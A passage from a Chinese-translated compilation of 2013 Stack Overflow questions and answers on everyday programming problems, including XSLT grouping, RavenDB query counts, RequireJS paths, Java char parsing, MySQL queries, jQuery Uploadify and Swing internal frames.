  <table cellpadding="10" cellspacing="0" border="1" style="padding:25px;">
    <!--table for head-->
    <tr>
      <!--table row-->
      <td colspan='2'>
        <!--table definition-->
        <b style="font-size:25px;">ELearning List</b>
        <!-- heading-->
      </td>
    </tr>
    <xsl:apply-templates select='Rows/Row'/>
  </table>
</xsl:template>
<xsl:template match='Row'>
  <!-- template is defined above -->
  <xsl:for-each select="$Rows[position() mod 3 = 1]">
    <!-- 3 recods in one row should be displayed -->
    <tr>
      <xsl:variable name="i" select="position() - 1" />
      <xsl:for-each select="$Rows[(position() &gt; ($i * 3)) and (position() &lt;= (($i + 1) * 3))]">
        <td>
          <img src="../PublishingImages/FLDRNEW.GIF" width="50px" height="50px" style="padding-right:20px;"></img>
          <!-- image is to display folder below which the hyperlinked text has been populated -->
          <br/>
          <a href="{@FileRef}" style="font-weight:bold;">
            <!-- it is the anchor tag which drives to the corresponding documents -->
            <xsl:value-of select="substring-after(string(@FileRef),'/Docs/')"/>
            <!-- fetches the value of Name column -->
          </a>
        </td>
      </xsl:for-each>
    </tr>
  </xsl:for-each>
</xsl:template> 
```

错误是：变量或参数“行”未定义或超出范围。请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:32:32.580

你能试试这个吗？

```
<xsl:template match='dsQueryResponse'>
  <table cellpadding="10" cellspacing="0" border="1" style="padding:25px;">
    <!--table for head-->
    <tr>
      <!--table row-->
      <td colspan='2'>
        <!--table definition-->
        <b style="font-size:25px;">ELearning List</b>
        <!-- heading-->
      </td>
    </tr>
    <xsl:apply-templates 
            select='Rows/Row[position() mod 3 = 1]' mode="group" />
  </table>
</xsl:template>

<xsl:template match='Row' mode="group">
  <tr>
    <xsl:apply-templates 
            select=". | following-sibling::Row[position() &lt; 3]" />
  </tr>
</xsl:template>

<xsl:template match="Row">
  <td>
    <!-- image is to display folder below which the hyperlinked text has 
            been populated -->
    <img src="../PublishingImages/FLDRNEW.GIF" width="50px" height="50px" 
         style="padding-right:20px;" />
    <br/>
    <!-- the anchor tag which drives to the corresponding documents -->
    <a href="{@FileRef}" style="font-weight:bold;">
      <!-- fetches the value of Name column -->
      <xsl:value-of select="substring-after(string(@FileRef),'/Docs/')"/>
    </a>
  </td>
</xsl:template> 
```

# statistics - RavenDB：Raven 查询未返回正确的文档授权计数

> ID：15357057
> 
> 赞同：3
> 
> 时间：2013-03-12T09:05:54.717
> 
> 标签：statistics, authorization, ravendb, where-clause

```
 public class EngineInfo 
  {
    public int Id{get;set;}

    public int? AircraftId { get; set; }

    public string SerialNumber { get; set; }

    public int Position { get; set; }

    public string RegNumber { get; set; }
    } 
```

// 这是使用上述模型的代码。我有 17,000 个使用此模型的文档

```
 ravenSession.Store(new AuthorizationUser
        {
            Id = "Authorization/Users/1",
            Name = "user-1",
            Permissions =
                            {
                                new OperationPermission
                                    {
                                        Allow = true,
                                        Operation = "EngineInfos/View",
                                        Tags = "Company/100"
                                    }
                            }
        });

 1\. var query = ravenSession.Query<EngineInfo>(); 
```

// 当我记录 query.Count() 时，我看到所有文档计数，即 17000，这忽略了我在 before 语句中设置的授权。如果我在上面的语句中添加 where 子句，它正在工作，我可以看到正确的计数。但我想获取用户有权访问的所有文档。

```
 2\. var query = ravenSession.Query<EngineInfo>().ToList(); 
```

现在，考虑到授权，我得到了正确的计数。但问题是除非我提到 Take(x)，否则它不会返回所有结果。我试过了

```
 RavenQueryStatistics queryStats;
    query.Statistics(out queryStats); 

   queryStats.TotalResults 
```

我仍然无法获得授权结果。我得到了所有的计数。

你能帮我弄清楚在不加载所有记录的情况下找到查询结果的 TotalCount 吗？

我的要求是在可搜索的 ExtJS 分页网格中显示所有引擎。我需要知道要显示的记录总数计算和显示页数（页数是固定的）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:32:18.927

这是设计使然，请参阅[http://ravendb.net/docs/intro/safe-by-default](http://ravendb.net/docs/intro/safe-by-default)。

`session.Query<Post>().Count()`将为您提供服务器上所有帖子的计数，同时 `session.Query<Post>().ToList().Count()`将提供已获取到客户端的帖子的计数。

默认情况下，RavenDB 将 .Take(128) 应用于查询，以鼓励您进行分页并默认安全。如果您想获得更多，那么您需要指定要取多少，例如`.Take(1024)`，但默认情况下，服务器一次不会返回超过 1024 个项目。您可以将服务器配置为这样做，但不建议这样做。您最好使用分页，因为无论如何用户都无法一次处理那么多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T21:40:40.137

您看到的是 Raven 的 QueryStatistics 忽略了授权包。这[已在 Raven Google Group 中报告](https://groups.google.com/forum/?fromgroups=#!topic/ravendb/YrEulS6xwP8)。

据我所知，在撰写本文时，还没有可靠的方法来获取查询的授权文档总数。在我看来，授权包应该包括一些对此的支持。

当我发现更多信息时，我会调查并更新这个答案。

# javascript - requirejs - 在不同的文件中加载具有不同名称的相同模块

> ID：15357058
> 
> 赞同：2
> 
> 时间：2013-03-12T09:05:55.653
> 
> 标签：javascript, requirejs, amd

使用 requirejs，我有两个文件依赖于同一个模块。我必须确保在两个依赖项中始终使用相同的模块名称吗？例如，如果我为 require.config 定义了一个路径：

```
'myMod':'src/js/myModule' 
```

然后一次使用名称，一次使用实际路径，如下所示：

```
//in a.js
define(function(require){
 var mod = require('myMod');
});

//in b.js
define(function(require){
 var mod = require('src/js/myModule');
}); 
```

显然，最佳实践是在任何地方都使用模块名称，但我想知道为什么这会导致实际错误。

requirejs 是否在使用的模块名称和实际加载的模块之间存储映射？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-01-03T13:52:03.500

正如你自己所说：

> 显然，最好的做法是在任何地方都使用模块名称

RequireJS 在一定程度上强制执行这种做法。问题是当你在你的文件中告诉 RequireJS 时`paths`，`'myMod':'src/js/myModule'`你实际上是在说你想`src/js/myModule`在 name 下加载`myMod`。如果您随后通过完整路径引用它，那么这很可能是您的错误。如果这发生在我的代码中，我会认为这是一个错误。所以我希望 RequireJS 在发生这种情况时失败。

还有语义问题。基本情况是，如果传递给`require`不同的两个名称，一旦解析了相对路径，那么它们将引用两个不同的模块。如果你这样做`require('myMod')`并且`require('src/js/myModule')`你期待两个*不同的*模块，那么就这样吧。如果你这样做`require('myMod')`，`require('myMod')`你会得到*相同*的模块。所以有了`paths`你设置的，你真正想要什么？*相同*的模块还是*不同*的模块？

RequireJS 有办法给你两个。如果您希望两个模块名称都为您提供相同的模块，则删除`paths`配置并改用`map`配置：

```
map: {
  '*': {
    myMod: 'src/js/myModule'
  }
} 
```

这意味着“在所有模块（`*`）中，如果对模块发出请求，则改为`myMod`加载模块”。`src/js/myModule`意图一清二楚。

如果您希望两个路径都为您提供不同的模块，*尽管它们共享相同的源*，您可以使用 RequireJS 插件来为您的模块加载相同的源，但让 RequireJS 将此单个源注册为不同的模块。

# java - a = '3' , b = '4' ... 如何在不更改任何值的情况下从 char 更改为 numeric？

> ID：15357068
> 
> 赞同：-7
> 
> 时间：2013-03-12T09:06:32.483
> 
> 标签：java

```
public class Exer4 {

    public static void main(String[] args) {
        char a = '3';
        char b = '4';
        char c = '2';
        int resultat;
        resultat = a*b/c;

        System.out.println("Result of "+a+"*"+b+"/"+c+" = "+ resultat);
    }
} 
```

我希望结果为：6（因为它是 3 * 4/2）但事实并非如此。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:09:42.973

由于是作业，我不会透露解决方案。但是，您应该查看`Integer.parseInt()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:15:54.453

您应该将变量分配为`int a = 3`等，因为它们是整数值而不是字符。字符`'3'`与整数不同`3`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:10:12.107

您必须将它们解析为`int`s。
尝试以下操作：

```
public static void main(String[] args) {
    char a = '3';
    char b = '4';
    char c = '2';
    int resultat;
    resultat = Integer.parseInt(a)* Integer.parseInt(b) / Integer.parseInt(c);

    System.out.println("Result of "+a+"*"+b+"/"+c+" = "+ resultat);
} 
```

根据您的值，最好将它们解析为`Double`.

或者，您可以轻松地直接使用`int`s ：

```
public static void main(String[] args) {
        int a = 3;
        int b = 4;
        int c = 2;
        int resultat;
        resultat = a * b / c;

        System.out.println("Result of "+a+"*"+b+"/"+c+" = "+ resultat);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:27:22.747

使用`Character.getNumericValue(Char a)`.
根据您的问题，您可以通过

```
int aa=Character.getNumericValue(a); 
int bb=Character.getNumericValue(b);
int cc= Character.getNumericValue(c);
resultat = aa*bb/cc;

System.out.println("Result of "+a+"*"+b+"/"+c+" = "+ resultat); 
```

# mediawiki-api - 如何使用 api 渲染 mediawiki 页面？

> ID：15357073
> 
> 赞同：1
> 
> 时间：2013-03-12T09:06:43.867
> 
> 标签：mediawiki-api

我应该想在另一个网页中插入一个维基百科页面，在一个 div 中，在 javascript 中使用某种 mediawiki api 调用，没有所有“编辑”按钮、菜单等；只有文章。

我对如何在网页元素中呈现维基媒体页面一无所知。

我不明白如何使用[http://www.mediawiki.org/wiki/API:Data_formats](http://www.mediawiki.org/wiki/API:Data_formats)因为我应该想要 html 格式。

我已经看过[http://www.mediawiki.org/wiki/API:Parsing_wikitext#parse](http://www.mediawiki.org/wiki/API:Parsing_wikitext#parse)但我在示例中阅读了它用于调试的东西？在[http://www.mediawiki.org/wiki/Manual:Parameters_to_index.php#View_and_render](http://www.mediawiki.org/wiki/Manual:Parameters_to_index.php#View_and_render)我已经看到了渲染动作，但它已被弃用？

那么，怎么可能呢？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T22:16:06.217

我在您链接到的页面上没有看到任何关于`action=parse`仅用于调试的内容。我认为这正是你应该做的。

API 不会直接为您提供 HTML，它将包含在 JSON（或[JSONP](http://en.wikipedia.org/wiki/JSONP)）中，但您可以从中获取 HTML。

# magento - 在magento中将按钮添加到目录类别

> ID：15357078
> 
> 赞同：0
> 
> 时间：2013-03-12T09:07:01.597
> 
> 标签：magento, magento-1.7

我想在管理员端添加新按钮到类别页面，删除类别并保存类别。我尝试覆盖块`Catalog_Category_Edit_Form`但没有工作的方法。我的 xml 代码是：

```
 <adminhtml>
        <rewrite>
                <Catalog_Category_Edit_Form>Mymodule_Block_Rewrite_Editcate</Catalog_Category_Edit_Form>
            </rewrite>
        </adminhtml> 
```

虽然我的块代码是

```
<?php
class Mymodule_Block_Rewrite_Editcate extends Mage_Adminhtml_Block_Catalog_Category_Edit_Form
{
    private $parent;

    protected function _prepareLayout()
    {
               // Delete button
         $this->parent = parent::_prepareLayout();

        $this->removeButton('delete_button');

        return $this->parent;
    }

}. 
```

谁能以正确的方式帮助我？在上面的代码中，我尝试删除按钮以检查我的代码是否有效。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T11:14:09.863

抱歉，我找到了解决方案。我的新 xml 看起来像

```
<adminhtml>

        <rewrite>
                <catalog_category_edit_form>Mymodule_Block_Adminhtml_Catalog_Category_Edit_Form</catalog_category_edit_form>
            </rewrite>

            </adminhtml> 
```

我的块代码是：

```
<?php
class Mymodule_Block_Adminhtml_Catalog_Category_Edit_Form extends Mage_Adminhtml_Block_Catalog_Category_Edit_Form
{

  protected function  _prepareLayout()
    {
           parent::_prepareLayout();
           $this->addAdditionalButton('update_button',  array('name' => 'update_button','title'=>'Copy Category','type'=>"button",'label'=> Mage::helper('catalog')->__('Copy Category') ));

        return parent::_prepareLayout();
    }

}. 
```

就是这样。Mian 函数是 addAdditionButton。只传递参数给它。我已经覆盖了它。

# ios - 如何从图像 ios 中查找产品名称或信息

> ID：15357081
> 
> 赞同：-1
> 
> 时间：2013-03-12T09:07:12.530
> 
> 标签：ios, objective-c, image, web-services, scanning

如何使用图像查找产品名称或信息。就像 RedLaser 应用程序正在做的那样，您只需拍摄产品，它就会分析并给出您的名称并给出相关产品。有没有任何网络服务可以帮助我解决这个问题。

我给我的液晶屏拍照

RedLaser 休息：执行：分析图像

结果：电脑显示器

如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T11:09:11.453

尝试图像识别，以实现您的目标。

您可以从以下链接中找到一些帮助来启动它。

*   [http://face.com/](http://face.com/)
*   [http://www.iqengines.com/](http://www.iqengines.com/)
*   [http://intopii.com/](http://intopii.com/)
*   [https://www.iqengines.com/](https://www.iqengines.com/)

# c - 什么将分配到指针 pfile 中？

> ID：15357093
> 
> 赞同：1
> 
> 时间：2013-03-12T09:07:36.743
> 
> 标签：c

```
FILE * pFile;
pFile = fopen ("myfile.txt","r");
if (pFile == NULL)
{ some code }

pFile = fopen ("myfile.txt","r") 
```

在这种情况下，将分配给`pFile`什么？因为`pFile`是一个指针，它只存储另一个变量的地址。我想知道“myfile.txt”是一个字符串吗？那么是不是 pFile = 存储字符串“myfile.txt”的数组地址？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:10:04.897

它指向一个`FILE`对象。细节取决于实现，不会影响用户代码。但它通常是一种结构，其中包括对特定于操作系统的文件处理机制的各种引用。

这是一个[*不透明指针*](http://en.wikipedia.org/wiki/Opaque_pointer)的例子。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:10:52.210

看看：[http ://www.cplusplus.com/reference/cstdio/fopen/](http://www.cplusplus.com/reference/cstdio/fopen/)

如果文件成功打开，该函数返回一个指向 FILE 对象的指针，该对象可用于在将来的操作中识别流。否则，返回一个空指针。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:10:05.583

它是一个指向`FILE`结构的指针，其中包含操作系统代表您访问文件所需的所有信息。

你不应该`fopen`在 C++ 中使用；你应该使用 a`std::ifstream`代替。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:12:05.017

从 fopen 手册页：

```
SYNOPSIS
       #include <stdio.h>

       FILE *fopen(const char *path, const char *mode);

       FILE *fdopen(int fd, const char *mode);

       FILE *freopen(const char *path, const char *mode, FILE *stream);

   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):

       fdopen(): _POSIX_C_SOURCE >= 1 || _XOPEN_SOURCE || _POSIX_SOURCE

DESCRIPTION
       The fopen() function opens the file whose name is the string pointed to by path and associates a stream with it. 
```

所以返回的指针用于访问文件的流。

# php - PDO 准备好的语句转换单引号

> ID：15357096
> 
> 赞同：0
> 
> 时间：2013-03-12T09:07:49.287
> 
> 标签：php, mysql, pdo

我找不到这个简单（？）问题的明确答案。

我最近搬到了 PDO 并做了简单的插入查询：

```
$sql = "INSERT INTO item(name) values (:name)";
$q = $db->prepare($sql);
$q->bindParam(':name', $name); 
```

现在，当我抛出参数“Dina's”时，它显然已转换为

```
"Dina&#39;s" 
```

（或者至少这是 phpmyadmin 中的内容）。

我可以以某种方式阻止这种转换，以便数据按照在 bindParam 上提供的方式存储吗？或者这个当前转换值是存储数据的最佳方式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:21:32.473

这段代码没有任何转换，您应该检查 $name 的来源以及它的真正价值。

# matlab - 如何清理/修复单元格数组 MATLAB 代码的映射，以免达到递归限制？

> ID：15357099
> 
> 赞同：1
> 
> 时间：2013-03-12T09:07:50.970
> 
> 标签：matlab, for-loop, cell-array

我必须解决一个问题，我必须为 ex [1 2 3] 取一个向量并使用一个表映射它，使得 1 = [1 1], 2 = [4 6 8], 3 = [6 9 12 15 ]（实际问题的简短示例）所以理想情况下我的功能是： `convert([1 2 3]) = [1 1 4 6 8 6 9 12 15]`

我的思考过程是，我必须先将向量变成一个元胞数组，以便我可以将值替换为其他不同维度的值，然后将元胞数组转换回向量/矩阵。这是我到目前为止所拥有的

```
y = num2cell(x);

for n = 1:length(x)
    if y{n} == 0
        y{n} = [0 2];
    elseif y{n} == 1
        y{n}= [1 1];
    elseif y{n} == 2
        y{n} = [4 6 8];
    elseif y{n} == 3
        y{n} = [6 9 12 15];

    elseif y{n} < 0
        y{n} = 1 - convert(-(x+1));
    end
    output = cell2mat(y);
end
end 
```

如果我的输入在初始向量中具有正值 0、1、2 或 3，则一切正常。但是，我需要有这样的条件，如果向量有一个负条目 (x)，则输入负条目，`y{n} = 1 - convert(-(x+1))`但是，当我这样做时，我得到一个达到递归限制的错误。有没有办法修复我的代码，使其可以使用负值而不产生错误？另外，有没有办法在不使用 for 或 while 循环的情况下做到这一点？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:19:17.407

您根本不需要单元格，但要回答您的问题，我建议您在循环之前处理否定项以避免任何不必要的递归所以假设我已经正确地遵循了您的代码，请遵循以下原则：

```
negs = x < 0;
x(negs) = -(x(negs) + 1)

y = num2cell(x);

for n = 1:length(x)
    if y{n} == 0
        y{n} = [0 2];
    elseif y{n} == 1
        y{n}= [1 1];
    elseif y{n} == 2
        y{n} = [4 6 8];
    elseif y{n} == 3
        y{n} = [6 9 12 15];
    end

    if negs(n)
        y{n} = 1 - x;
    end
    output = cell2mat(y);
    end
end 
```

顺便说一句，我觉得这行`y{n} = 1 - x;`实际上应该是`y{n} = 1 - x(n);` （即您的原始代码应该已经阅读`y{n} = 1 - convert(-(x(n)+1));`

# perl - 在范围内使用 perl bigint

> ID：15357101
> 
> 赞同：0
> 
> 时间：2013-03-12T09:07:56.190
> 
> 标签：perl, bigint

当我遍历某个整数范围并尝试将 $_ 值用作 bigint 时，它的行为类似于常规数字。因此， `100000000000000000000 1e+20` 当我希望看到`100000000000000000000 100000000000000000000`.

```
use warnings;
use strict;
use bigint;

for my $b(10) {
    for my $c(20) {
        print $b**$c, "\n";
    }
}

for my $b(10..10) {
    for my $c(20..20) {
        print $b**$c, "\n";
    }
} 
```

如何使此代码以正确的方式运行？我确实知道 Math::BigInt，但我想知道没有它是否有解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:07:20.153

我不知道确切的原因，但下面的链接将帮助您打印确切的值。获取控制字符串长度并打印值。

[Perl - 删除没有指数值的尾随零](https://stackoverflow.com/questions/8674554/perl-remove-trailing-zeroes-without-exponential-value)

# php - 面向对象编程

> ID：15357103
> 
> 赞同：-4
> 
> 时间：2013-03-12T09:07:57.913
> 
> 标签：php

我正在做一个关于开发研究所信息系统的项目。用户分为三种类型，管理员、教职员工和学生用户。所有这些类都有一些共同的特殊属性。如何在 PHP 中实现这个面向对象的模型，以便增加代码的可用性。如果有人可以推荐书籍或链接，那将非常有帮助。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:12:24.937

首先，我建议您查看一些可用的框架，例如`Yii`, `CodeIgniter`，`Zend`以及为此类项目提供某种结构的其他框架。

大多数 MVC 框架还支持 PHP 中的面向对象编程。

对我来说，我认为`YII`是最面向对象的方法，因为它完全基于并且不支持向后兼容 PHP 5.1 或更早版本。

有关更多信息，我建议您查看[此页面](http://www.yiiframework.com/features/)，其中包含功能概述。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:45:39.300

虽然这是一个（非常）广泛的问题。听起来您想要一个具有共享功能/属性的抽象类 User

```
<?php
abstract class User {
    public function __construct() { /* what to do on initiation */ }

    /* -- Common functions here --  */
}

class Admin extends User {
   /* -- Admin only functions -- */
}

class Faculty extends User {
   /* -- Faculty only functions -- */
}

class Student extends User {
   /* -- Student only functions -- */
} 
```

我建议阅读有关正确使用类/对象的[PHP 手册。](http://www.php.net/manual/en/oop5.intro.php)

# javascript - XML getElementsByTagName 中途退出

> ID：15357108
> 
> 赞同：0
> 
> 时间：2013-03-12T09:08:10.190
> 
> 标签：javascript, xml

我有一个如下的 XML 文件：

```
<products>
<handle id = "B1-12">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Del Mar Handle in Venetian Bronze</full_name>
    <partial_name>Baldwin Del Mar</partial_name>
</handle>
<handle id = "B2-12">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Elizabeth Handle in Venetian Bronze</full_name>
    <partial_name>Baldwin Elizabeth</partial_name>
</handle>
<handle id = "B3-12">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin New Hampshire Handle in Venetian Bronze</full_name>
    <partial_name>Baldwin New Hampshire</partial_name>
</handle>
<handle id = "B4-12">
    <single_price>230</single_price>
    <double_price>460</double_price>
    <full_name>Baldwin Westcliff Handle in Venetian Bronze</full_name>
    <partial_name>Baldwin Westcliff</partial_name>
</handle>
<handle id = "B1-49">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Del Mar Handle in Matte Brass & Black</full_name>
    <partial_name>Baldwin Del Mar</partial_name>
</handle>
<handle id = "B2-49">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Elizabeth Handle in Matte Brass & Black</full_name>
    <partial_name>Baldwin Elizabeth</partial_name>
</handle>
<handle id = "B3-49">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin New Hampshire Handle in Matte Brass & Black</full_name>
    <partial_name>Baldwin New Hampshire</partial_name>
</handle>
<handle id = "B4-49">
    <single_price>230</single_price>
    <double_price>460</double_price>
    <full_name>Baldwin Westcliff Handle in Matte Brass & Black</full_name>
    <partial_name>Baldwin Westcliff</partial_name>
</handle>
<handle id = "B1-52">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Del Mar Handle in Matte Antique Nickel</full_name>
    <partial_name>Baldwin Del Mar</partial_name>
</handle>
<handle id = "B2-52">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin Elizabeth Handle in Matte Antique Nickel</full_name>
    <partial_name>Baldwin Elizabeth</partial_name>
</handle>
<handle id = "B3-52">
    <single_price>265</single_price>
    <double_price>530</double_price>
    <full_name>Baldwin New Hampshire Handle in Matte Antique Nickel</full_name>
    <partial_name>Baldwin New Hampshire</partial_name>
</handle>
<handle id = "B4-52">
    <single_price>230</single_price>
    <double_price>460</double_price>
    <full_name>Baldwin Westcliff Handle in Matte Antique Nickel</full_name>
    <partial_name>Baldwin Westcliff</partial_name>
</handle>
<handle id = "P1">
    <single_price>350</single_price>
    <double_price>600</double_price>
    <full_name>Pull Handle 1</full_name>
    <partial_name>Pull Handle 1</partial_name>
</handle>
<handle id = "P3">
    <single_price>350</single_price>
    <double_price>600</double_price>
    <full_name>Pull Handle 2</full_name>
    <partial_name>Pull Handle 2</partial_name>
</handle>
<handle id = "P4">
    <single_price>350</single_price>
    <double_price>600</double_price>
    <full_name>Pull Handle 3</full_name>
    <partial_name>Pull Handle 3</partial_name>
</handle>
</products> 
```

我试图让句柄项目稍后使用数据。但是，它似乎在第五项上失败了。当我这样做时：

```
var xml = new XMLHttpRequest();

xml.onreadystatechange = function ()
{
   if(xml.readyState == 4)
   {
      var xmlDoc = xml.responseXML;
      if(!xmlDoc)
      xmlDoc = (new DOMParser()).parseFromString(xml.responseText, 'text/xml');

      var handle_list = xmlDoc.getElementsByTagName("handle");

      console.log(handle_list);
   }
} 
```

我在控制台中收到这个：

```
[handle, handle, handle, handle, handle, item: function]
0: handle
1: handle
2: handle
3: handle
4: handle
length: 5
__proto__: NodeList 
```

此外，日志中索引 4 处的项目不完整。我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-18T09:35:52.397

我将我的评论添加为答案，因为这似乎是您可以将此问题标记为已回答的答案。

> 在解析器停止的标记周围的 xml 文件中有一个未转义的 & 符号。也许这是您的问题的原因？

# javascript - 根据复选框隐藏页面加载时的 div

> ID：15357112
> 
> 赞同：-2
> 
> 时间：2013-03-12T09:08:23.873
> 
> 标签：javascript, html

我只想在页面加载时隐藏一个 div，它取决于复选框，如果选中复选框，则它在页面加载时隐藏，如果没有，则显示 div 做什么请帮助....

```
try{
st1=con.createStatement();
String QueryString = "SELECT c.course_code,c.course_id,t.topic_name,l.lo_name,l.session,l.status,l.lo_id FROM course as c JOIN topic as t JOIN los as l WHERE c.course_id=t.course_id AND t.topic_id=l.topic_id AND t.topic_id = '"+top1+"'";

rs1 = st1.executeQuery(QueryString);
while (rs1.next()){
    id=rs1.getInt(7);
    course=rs1.getString(1);
    topicName=rs1.getString(3);
   lo=rs1.getString(4);
   sess=rs1.getString(5);

enter code here 
```

} }抓住（）{

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:15:12.310

[http://jsbin.com/aqakap/1/edit](http://jsbin.com/aqakap/1/edit)

在 html 中：

```
<input id="check" type="checkbox" checked/><label for="check">Check</label>
<div id="msg">
  aloha
</div> 
```

在 JavaScript 中：

```
var checkbox = document.getElementById("check"),
    msg = document.getElementById('msg');

if (checkbox.checked)
  msg.style.display = "none";
else
  msg.style.display = "block"; 
```

mz

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:14:16.593

对超级模糊问题的超级模糊回答：

```
window.onload = function() {
    var checked = document.getElementById('checkbox').checked;
    document.getElementById('div').style.display = checked ? 'none' : 'block';
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-12T09:13:00.693

为该 div 提供任何类名。用于页面加载的 Jquery 代码。

```
$(document).ready(function() {
  $(".classname").hide();
}); 
```

如果选中复选框，则在该选择框中，输入

> onclick='show_selected_div();'

JS代码

```
function show_selected_div(){
  $(".classname").show();
} 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-03-12T09:13:11.383

假设您使用的是 jQuery，这应该是您所需要的。

```
$('<checkboxid>').click ( function() {
  $('<divid>').hide();
}); 
```

# mysql - mysql 2行中的多个值

> ID：15357113
> 
> 赞同：0
> 
> 时间：2013-03-12T09:08:24.573
> 
> 标签：mysql

我有一个包含这些字段的表： `phID`，`ProductID`

`phID`是药房 ID，是`ProductID`产品 ID。

*   一家药店有多种产品
*   1 件产品销往多家药店

例子：

```
phID    ProductID
-----------------
1001    9
1001    10
1001    11
1004    9
1004    12
1004    14
1004    11 
```

我想要的查询是这样我可以获得所有`phID`具有相同产品的产品。我有这个查询：

```
SELECT phID, ProductID
FROM ph_pd
WHERE ProductID IN (9,10,11) 
```

我希望结果是

```
1001 9
1004 9
1001 11
1004 11 
```

要不就

```
1001
1004 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:09:50.860

如果你想获得属于特定productID的不同phID，你必须使用DISTINCT ...

```
 SELECT distinct phID FROM ph_pd WHERE ProductID IN (9,10,11) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:21:36.307

您可以使用 ：

```
SELECT p.phID , p.ProductID FROM ph_pd p
WHERE (select count(*) from ph_pd where ProductID = p.ProductID) >= 2
ORDER BY ProductID ; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:10:55.617

```
SELECT  phID
FROM    tableName
WHERE   productID IN (9,10,11)
GROUP   BY phID
HAVING  COUNT(DISTINCT productID) = 2 -- since there are two stores 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/5fe0b/3)

# jquery - 如何在 JQuery File 'uploadify' 插件中显示文件上传成功警报消息？

> ID：15357117
> 
> 赞同：0
> 
> 时间：2013-03-12T09:08:35.493
> 
> 标签：jquery, asp.net-mvc, file-upload, uploadify

我正在使用 Jquery File Uploadify 插件进行文档上传，它有**多个**true，当我在 OnComplete 函数中使用警报时，在上传文档时显示多个警报..

```
function loadSwf(){    
    $("#fileuploader").fileUpload({
            'uploader':  "@Url.Content("~/Scripts/FileUpload/uploader.swf")",
            'cancelImg':  "@Url.Content("~/Content/Images/clearBtn.png")",
            'buttonText': 'Browse Files',
            //'buttonImg' : "@Url.Content("~/Content/Images/attachDoc.png")",
            'script': "@Url.Content("~/Documents/Upload/")",   
            'folder': "@Url.Content("~/Documents/")",
            //'fileDesc': 'Documents Files',
            'fileExt': '*.pdf;*.doc;*.ppt;*.xls',
            'multi': true,
            'auto': false,                 
            'scriptData': {'ActivityID': $('[id="ActivityID"]').val(), 'Description' :  "test" },
            'onComplete': function(settings, data) {  
             alert("File Uploaded Successfully");
        }
        });
} 
```

此代码适用于上传一个文件。但是当我上传多个文件时，我会收到每个文件的警报消息！如何在上传所有文件后仅获取一次警报消息，而不是每个文件一个警报。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T13:07:04.657

您需要使用**[onQueueComplete](http://www.uploadify.com/documentation/uploadify/onqueuecomplete/)**事件

```
$("#fileuploader").fileUpload({
    'uploader':  "@Url.Content("~/Scripts/FileUpload/uploader.swf")",
    'cancelImg':  "@Url.Content("~/Content/Images/clearBtn.png")",
    'buttonText': 'Browse Files',
    //'buttonImg' : "@Url.Content("~/Content/Images/attachDoc.png")",
    'script': "@Url.Content("~/Documents/Upload/")",   
    'folder': "@Url.Content("~/Documents/")",
    //'fileDesc': 'Documents Files',
    'fileExt': '*.pdf;*.doc;*.ppt;*.xls',
    'multi': true,
    'auto': false,                 
    'scriptData': {'ActivityID': $('[id="ActivityID"]').val(), 'Description' :  "test" },
        'onQueueComplete' : function(queueData) {
            alert("Files Uploaded Successfully");
        }
    }
}); 
```

# java - 设置打开更多 Jinternalframes 的限制

> ID：15357119
> 
> 赞同：-4
> 
> 时间：2013-03-12T09:08:43.070
> 
> 标签：java, swing

在我的项目中，我有，`JDesktopPane`并且`Jmenu`在那个菜单中我有更多的 internalFrames，我想为用户设置一个限制，以便用户最多只能打开三个`JinternalFrames`。

我不知道如何做到这一点，请帮助我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:20:06.607

我想到了两件事。

第一种是扩展`JDesktopPane`并覆盖该`addImpl`方法。在这里，您可以检查桌面上的组件数量，并在达到限制时停止添加。

第二个类似，基本上，当菜单激活您`actionPerformed`的方法时，您检查桌面窗格中包含多少组件并在达到限制时停止添加。

